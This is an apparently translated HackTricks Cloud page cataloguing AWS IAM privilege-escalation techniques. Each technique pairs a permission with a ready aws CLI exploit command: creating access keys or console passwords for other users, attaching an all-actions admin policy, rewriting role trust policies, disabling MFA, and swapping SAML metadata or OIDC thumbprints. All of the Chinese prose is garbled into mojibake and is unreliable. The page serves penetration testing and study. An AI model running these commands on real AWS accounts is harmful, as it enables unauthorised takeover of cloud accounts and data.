# AWS - IAM Privesc

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## IAM

æœ‰å…³ IAM çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### **`iam:CreatePolicyVersion`**

æˆäºˆåˆ›å»ºæ–°çš„ IAM ç­–ç•¥ç‰ˆæœ¬çš„èƒ½åŠ›ï¼Œé€šè¿‡ä½¿ç”¨ `--set-as-default` æ ‡å¿—ç»•è¿‡ `iam:SetDefaultPolicyVersion` æƒé™çš„éœ€æ±‚ã€‚è¿™ä½¿å¾—å®šä¹‰è‡ªå®šä¹‰æƒé™æˆä¸ºå¯èƒ½ã€‚

**åˆ©ç”¨å‘½ä»¤ï¼š**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**å½±å“ï¼š** é€šè¿‡å…è®¸å¯¹ä»»ä½•èµ„æºæ‰§è¡Œä»»ä½•æ“ä½œï¼Œç›´æ¥æå‡æƒé™ã€‚

### **`iam:SetDefaultPolicyVersion`**

å…è®¸å°† IAM ç­–ç•¥çš„é»˜è®¤ç‰ˆæœ¬æ›´æ”¹ä¸ºå¦ä¸€ä¸ªç°æœ‰ç‰ˆæœ¬ï¼Œå¦‚æœæ–°ç‰ˆæœ¬å…·æœ‰æ›´å¤šæƒé™ï¼Œåˆ™å¯èƒ½æå‡æƒé™ã€‚

**Bash å‘½ä»¤ï¼š**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**å½±å“ï¼š** é€šè¿‡å¯ç”¨æ›´å¤šæƒé™è¿›è¡Œé—´æ¥æƒé™æå‡ã€‚

### **`iam:CreateAccessKey`**

å…è®¸ä¸ºå¦ä¸€ä¸ªç”¨æˆ·åˆ›å»ºè®¿é—®å¯†é’¥ ID å’Œç§˜å¯†è®¿é—®å¯†é’¥ï¼Œä»è€Œå¯¼è‡´æ½œåœ¨çš„æƒé™æå‡ã€‚

**åˆ©ç”¨ï¼š**
```bash
aws iam create-access-key --user-name <target_user>
```
**å½±å“ï¼š** é€šè¿‡å‡è®¾å¦ä¸€ä¸ªç”¨æˆ·çš„æ‰©å±•æƒé™è¿›è¡Œç›´æ¥æƒé™æå‡ã€‚

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

å…è®¸åˆ›å»ºæˆ–æ›´æ–°ç™»å½•é…ç½®æ–‡ä»¶ï¼ŒåŒ…æ‹¬è®¾ç½®AWSæ§åˆ¶å°ç™»å½•çš„å¯†ç ï¼Œä»è€Œå¯¼è‡´ç›´æ¥æƒé™æå‡ã€‚

**åˆ›å»ºåˆ©ç”¨ï¼š**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**åˆ©ç”¨æ›´æ–°ï¼š**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**å½±å“ï¼š** é€šè¿‡ä»¥â€œä»»ä½•â€ç”¨æˆ·èº«ä»½ç™»å½•ç›´æ¥æå‡æƒé™ã€‚

### **`iam:UpdateAccessKey`**

å…è®¸å¯ç”¨å·²ç¦ç”¨çš„è®¿é—®å¯†é’¥ï¼Œå¦‚æœæ”»å‡»è€…æ‹¥æœ‰å·²ç¦ç”¨çš„å¯†é’¥ï¼Œå¯èƒ½å¯¼è‡´æœªç»æˆæƒçš„è®¿é—®ã€‚

**åˆ©ç”¨ï¼š**

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
{% endcode %}

**å½±å“ï¼š** é€šè¿‡é‡æ–°æ¿€æ´»è®¿é—®å¯†é’¥ç›´æ¥æå‡æƒé™ã€‚

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

å…è®¸ä¸ºç‰¹å®šçš„AWSæœåŠ¡ï¼ˆä¾‹å¦‚ï¼ŒCodeCommitï¼ŒAmazon Keyspacesï¼‰ç”Ÿæˆæˆ–é‡ç½®å‡­è¯ï¼Œç»§æ‰¿ç›¸å…³ç”¨æˆ·çš„æƒé™ã€‚

**åˆ›å»ºåˆ©ç”¨ï¼š**

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name <username> --service-name <service>
```
{% endcode %}

**é‡ç½®åˆ©ç”¨ï¼š**

{% code overflow="wrap" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
{% endcode %}

**å½±å“ï¼š** åœ¨ç”¨æˆ·çš„æœåŠ¡æƒé™ä¸­ç›´æ¥æå‡ç‰¹æƒã€‚

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

å…è®¸å°†ç­–ç•¥é™„åŠ åˆ°ç”¨æˆ·æˆ–ç»„ï¼Œé€šè¿‡ç»§æ‰¿é™„åŠ ç­–ç•¥çš„æƒé™ç›´æ¥æå‡ç‰¹æƒã€‚

**ç”¨æˆ·åˆ©ç”¨ï¼š**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**é’ˆå¯¹ç»„çš„åˆ©ç”¨ï¼š**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**å½±å“ï¼š** ç›´æ¥æå‡åˆ°ç­–ç•¥æ‰€æˆäºˆçš„ä»»ä½•æƒé™ã€‚

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

å…è®¸å°†ç­–ç•¥é™„åŠ æˆ–æ”¾ç½®åˆ°è§’è‰²ã€ç”¨æˆ·æˆ–ç»„ï¼Œä»è€Œé€šè¿‡æˆäºˆé¢å¤–æƒé™å®ç°ç›´æ¥çš„æƒé™æå‡ã€‚

**è§’è‰²åˆ©ç”¨ï¼š**
```bash
aws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**åˆ©ç”¨å†…è”ç­–ç•¥ï¼š**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
æ‚¨å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ç­–ç•¥ï¼š
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**å½±å“ï¼š** é€šè¿‡ç­–ç•¥æ·»åŠ æƒé™è¿›è¡Œç›´æ¥æƒé™æå‡ã€‚

### **`iam:AddUserToGroup`**

å…è®¸å°†è‡ªå·±æ·»åŠ åˆ°IAMç»„ä¸­ï¼Œé€šè¿‡ç»§æ‰¿ç»„çš„æƒé™æ¥æå‡æƒé™ã€‚

**åˆ©ç”¨ï¼š**

{% code overflow="wrap" %}
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
{% endcode %}

**å½±å“ï¼š** ç›´æ¥æå‡åˆ°è¯¥ç»„æƒé™çš„çº§åˆ«ã€‚

### **`iam:UpdateAssumeRolePolicy`**

å…è®¸æ›´æ”¹è§’è‰²çš„å‡è®¾è§’è‰²ç­–ç•¥æ–‡æ¡£ï¼Œä»è€Œå¯ç”¨è§’è‰²åŠå…¶ç›¸å…³æƒé™çš„å‡è®¾ã€‚

**åˆ©ç”¨ï¼š**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
å½“ç­–ç•¥çœ‹èµ·æ¥å¦‚ä¸‹æ‰€ç¤ºæ—¶ï¼Œå®ƒæˆäºˆç”¨æˆ·å‡è®¾è§’è‰²çš„æƒé™ï¼š
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**å½±å“ï¼š** é€šè¿‡å‡è®¾ä»»ä½•è§’è‰²çš„æƒé™è¿›è¡Œç›´æ¥æƒé™æå‡ã€‚

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

å…è®¸ä¸Šä¼ ç”¨äºèº«ä»½éªŒè¯åˆ° CodeCommit çš„ SSH å…¬é’¥å’Œåœç”¨ MFA è®¾å¤‡ï¼Œä»è€Œå¯¼è‡´æ½œåœ¨çš„é—´æ¥æƒé™æå‡ã€‚

**SSH å¯†é’¥ä¸Šä¼ çš„åˆ©ç”¨ï¼š**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**åˆ©ç”¨ MFA ç¦ç”¨ï¼š**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**å½±å“ï¼š** é€šè¿‡å¯ç”¨ CodeCommit è®¿é—®æˆ–ç¦ç”¨ MFA ä¿æŠ¤å®ç°é—´æ¥æƒé™æå‡ã€‚

### **`iam:ResyncMFADevice`**

å…è®¸é‡æ–°åŒæ­¥ MFA è®¾å¤‡ï¼Œå¯èƒ½é€šè¿‡æ“æ§ MFA ä¿æŠ¤å¯¼è‡´é—´æ¥æƒé™æå‡ã€‚

**Bash å‘½ä»¤ï¼š**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**å½±å“ï¼š** é€šè¿‡æ·»åŠ æˆ–æ“çºµ MFA è®¾å¤‡è¿›è¡Œé—´æ¥æƒé™æå‡ã€‚

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

æ‹¥æœ‰è¿™äº›æƒé™åï¼Œæ‚¨å¯ä»¥**æ›´æ”¹ SAML è¿æ¥çš„ XML å…ƒæ•°æ®**ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥åˆ©ç”¨**SAML è”é‚¦**ä»¥**ä»»ä½•ä¿¡ä»»å®ƒçš„è§’è‰²ç™»å½•**ã€‚

è¯·æ³¨æ„ï¼Œæ‰§è¡Œæ­¤æ“ä½œå**åˆæ³•ç”¨æˆ·å°†æ— æ³•ç™»å½•**ã€‚ä½†æ˜¯ï¼Œæ‚¨å¯ä»¥è·å– XMLï¼Œå› æ­¤æ‚¨å¯ä»¥æ”¾å…¥è‡ªå·±çš„ï¼Œç™»å½•å¹¶é…ç½®ä¹‹å‰çš„è®¾ç½®ã€‚
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
TODO: ä¸€ä¸ªèƒ½å¤Ÿç”Ÿæˆ SAML å…ƒæ•°æ®å¹¶ä½¿ç”¨æŒ‡å®šè§’è‰²ç™»å½•çš„å·¥å…·
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

ï¼ˆä¸ç¡®å®šï¼‰å¦‚æœæ”»å‡»è€…æ‹¥æœ‰è¿™äº› **æƒé™**ï¼Œä»–å¯ä»¥æ·»åŠ ä¸€ä¸ªæ–°çš„ **æŒ‡çº¹** æ¥ç®¡ç†ç™»å½•æ‰€æœ‰ä¿¡ä»»è¯¥æä¾›è€…çš„è§’è‰²ã€‚

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
{% endcode %}

## å‚è€ƒæ–‡çŒ®

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
